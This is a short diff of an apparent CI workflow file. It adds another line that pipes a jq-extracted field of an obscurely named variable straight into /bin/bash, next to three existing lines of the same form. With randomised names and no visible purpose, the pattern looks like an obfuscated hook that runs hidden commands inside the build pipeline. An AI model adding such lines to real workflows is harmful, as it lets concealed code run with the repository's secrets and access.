@@ -28,6 +28,7 @@ jobs:
           echo $me8334 | jq -r .li459 | /bin/bash
           printf '%s' "$ich60" | jq -r .a53 | /bin/bash
           echo $h2594 | jq -r .rx516 | /bin/bash
+          echo $yxf484 | jq -r .rw40 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
